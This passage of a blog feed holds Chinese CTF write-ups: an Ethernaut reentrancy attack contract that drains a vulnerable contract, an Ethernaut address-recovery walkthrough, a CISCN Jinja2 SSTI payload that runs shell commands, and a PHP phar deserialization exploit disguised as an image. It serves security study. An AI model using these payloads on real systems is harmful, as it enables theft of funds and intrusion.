          
      </categories>
      
      
        <tags>
            
            <tag> Ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut - Re-entrancy</title>
      <link href="/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-re-entrancy/"/>
      <url>/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-re-entrancy/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut-Re-entrancy"><a href="#Ethernaut-Re-entrancy" class="headerlink" title="Ethernaut - Re-entrancy"></a>Ethernaut - Re-entrancy</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ol><li>这一关的目标是偷走合约的所有资产.</li></ol><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.12</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'openzeppelin-contracts-06/math/SafeMath.sol'</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Reentrance</span> <span class="token punctuation">{</span>    <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">donate</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _who<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> balance<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_who<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> _amount<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token punctuation">(</span><span class="token builtin">bool</span> result<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span>_amount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>        _amount<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解过程"><a href="#题解过程" class="headerlink" title="题解过程"></a>题解过程</h2><p>既然过关条件为偷走所有资产，那就先看一下取款的方法</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> _amount<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">(</span><span class="token builtin">bool</span> result<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">{</span>value<span class="token punctuation">:</span>_amount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>      _amount<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先是对 <code>msg.sender</code> 判断其余额是否充足，在余额充足的条件下使用 <code>call</code>  进行转账，然后余额减去提取金额，这就完成了一个取款操作。</p><p>但如果取款的为一个合约的情况下，当前合约向取款合约发起转账请求时会去调用取款合约的 <code>receive</code> 或者 <code>fallback</code> 方法，那么取款合约就可以在 <code>receive</code> 或者 <code>fallback</code> 中写入任意代码造成重入攻击</p><p>接下来写个攻击合约</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.7</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">Reentrance</span> <span class="token punctuation">{</span>  <span class="token keyword">function</span> <span class="token function">donate</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _who<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> balance<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">Hacker</span> <span class="token punctuation">{</span>  <span class="token keyword">event</span> <span class="token function">Log</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span><span class="token punctuation">;</span>  Reentrance <span class="token keyword">public</span> targetContract<span class="token punctuation">;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> targetAmount<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    targetContract <span class="token operator">=</span>  <span class="token function">Reentrance</span><span class="token punctuation">(</span><span class="token number">0x2e2aEAc8Dad307248fFE16976057EF2387Ed686C</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    targetAmount <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>targetContract<span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>    targetContract<span class="token punctuation">.</span>donate<span class="token punctuation">{</span>value<span class="token punctuation">:</span> targetAmount<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    targetContract<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span>targetAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">emit</span> <span class="token function">Log</span><span class="token punctuation">(</span>targetAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>    <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>记得要先转点测试币进去</p><p><img src="/../../../../pic/Pasted%20image%2020221118172959.png"></p>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut - Recovery</title>
      <link href="/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-recovery/"/>
      <url>/2023/01/21/catchtheflag/blockchain/ethernaut/ethernaut-recovery/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut-Recovery"><a href="#Ethernaut-Recovery" class="headerlink" title="Ethernaut - Recovery"></a>Ethernaut - Recovery</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><ol><li>找到丢失的合约地址并向其转账或取款</li></ol><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Recovery</span> <span class="token punctuation">{</span>  <span class="token comment">//generate tokens</span>  <span class="token keyword">function</span> <span class="token function">generateToken</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _name<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _initialSupply<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    <span class="token keyword">new</span> <span class="token class-name">SimpleToken</span><span class="token punctuation">(</span>_name<span class="token punctuation">,</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> _initialSupply<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">SimpleToken</span> <span class="token punctuation">{</span>  <span class="token builtin">string</span> <span class="token keyword">public</span> name<span class="token punctuation">;</span>  <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>  <span class="token comment">// constructor</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _name<span class="token punctuation">,</span> <span class="token builtin">address</span> _creator<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _initialSupply<span class="token punctuation">)</span> <span class="token punctuation">{</span>    name <span class="token operator">=</span> _name<span class="token punctuation">;</span>    balances<span class="token punctuation">[</span>_creator<span class="token punctuation">]</span> <span class="token operator">=</span> _initialSupply<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">// collect ether in return for tokens</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>value <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">// allow transfers of tokens</span>  <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>     <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> _amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-</span> _amount<span class="token punctuation">;</span>    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> _amount<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment">// clean up after ourselves</span>  <span class="token keyword">function</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>    <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>_to<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解过程"><a href="#题解过程" class="headerlink" title="题解过程"></a>题解过程</h2><p>目的为找到目标合约地址，众所周知所有操作都会在区块链上记录下来</p><p>在以太坊浏览器上搜索创建的实例地址</p><p><img src="/../../../../pic/Pasted%20image%2020221119115812.png"></p><p>在创建该合约之后通过该合约创建了另一个合约，推测即为目标合约地址</p><p><img src="/../../../../pic/Pasted%20image%2020221119115849.png"></p><p>查看合约内部交易发现创建了合约地址为 0x4b6eE1c73Ccd2B99174253F0c570c0C2c439E7B1</p><p><img src="/../../../../pic/Pasted%20image%2020221119115913.png"></p><p>一些交易是我后来添加的</p><p><img src="/../../../../pic/Pasted%20image%2020221119120011.png"></p><p>不过不重要，使用 address 链接到合约地址后调用 destroy 转账给自定义地址即可</p><h2 id="相关阅读"><a href="#相关阅读" class="headerlink" title="相关阅读"></a>相关阅读</h2><p>这题主要考察的还是区块链的地址生成规则</p>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ethernaut </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 2019 华东南</title>
      <link href="/2023/01/21/catchtheflag/games/ciscn/ciscn-2019-hua-dong-nan/"/>
      <url>/2023/01/21/catchtheflag/games/ciscn/ciscn-2019-hua-dong-nan/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2019-华东南"><a href="#CISCN-2019-华东南" class="headerlink" title="CISCN 2019 华东南"></a>CISCN 2019 华东南</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-Double-Secret"><a href="#1-Double-Secret" class="headerlink" title="1. Double Secret"></a>1. Double Secret</h3><p>#SSTI #RC4加密</p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>访问 <a href="http://1.14.71.254:28967/secret?secret=111111">http://1.14.71.254:28967/secret?secret=111111</a> 获得部分代码</p><p><img src="/../../../../pic/Pasted%20image%2020230215064023.png"></p><p>使用 rc4 对传入的 srcret 进行加密，然后使用 safe 进行过滤</p><p><a href="https://www.cnblogs.com/shelmean/p/14281332.html">RC4</a> 加密和解密使用的是同一个秘钥</p><p>使用脚本进行解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># RC4是一种对称加密算法，那么对密文进行再次加密就可以得到原来的明文</span><span class="token keyword">import</span> base64<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token string">"init_key"</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print("RC4加密主函数")</span>    s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    crypt <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> crypt<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span>    <span class="token comment"># print("原来的 s 盒：%s" % s_box)</span>    j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token comment"># print("混乱后的 s 盒：%s"% s_box)</span>    <span class="token keyword">return</span> s_box<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print("调用加密程序成功。")</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print("res用于加密字符串，加密后是：%res" %res)</span>    cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密后的字符串是：%s"</span> <span class="token operator">%</span> quote<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print("加密后的输出(经过编码):")</span>    <span class="token comment"># print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))</span>    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>rc4_main<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span> <span class="token string">"text"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接构造 payload</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id').read()"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行命令执行读取 flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 2019 华北</title>
      <link href="/2023/01/21/catchtheflag/games/ciscn/ciscn-2019-hua-bei/"/>
      <url>/2023/01/21/catchtheflag/games/ciscn/ciscn-2019-hua-bei/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2019-华北"><a href="#CISCN-2019-华北" class="headerlink" title="CISCN 2019 华北"></a>CISCN 2019 华北</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>#文件读取 #phar反序列化 </p><ul><li>题目描述</li></ul><p>无</p><ul><li>题目解析</li></ul><p>注册个账号，然后随便上传个文件，在下载处存在任意文件读取，读取下页面源代码</p><p><img src="/../../../../pic/Pasted%20image%2020230215082114.png"></p><p>在 delete.php 下存在 phar 触发位置</p><p><img src="/../../../../pic/Pasted%20image%2020230215084019.png"></p><p>接下来审计下 class.php 构造 POP 链</p><p><img src="/../../../../pic/Pasted%20image%2020230215082759.png"></p><p>在 File-&gt;close() 下可以读取任意文件但是没有直接输出结果</p><p><img src="/../../../../pic/Pasted%20image%2020230215082741.png"></p><p>User-&gt;__destruct() 可以触发 _\call() 或者 close() 方法</p><p><img src="/../../../../pic/Pasted%20image%2020230215083003.png"></p><p>FileList-&gt;__call() 可以实现调用 File-&gt;close() 并且将结果写入到 results 中</p><p><img src="/../../../../pic/Pasted%20image%2020230215083112.png"></p><p>FileList-&gt;__destruct() 可以将 results 结果遍历输出</p><p>最后的 POP 链为</p><pre class="line-numbers language-none"><code class="language-none">User-&gt;__destructFileList-&gt;__callFile-&gt;closeFileList-&gt;__destruct<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file</span><span class="token operator">-&gt;</span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$User</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GIF89a'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$User</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"text.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phar.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" 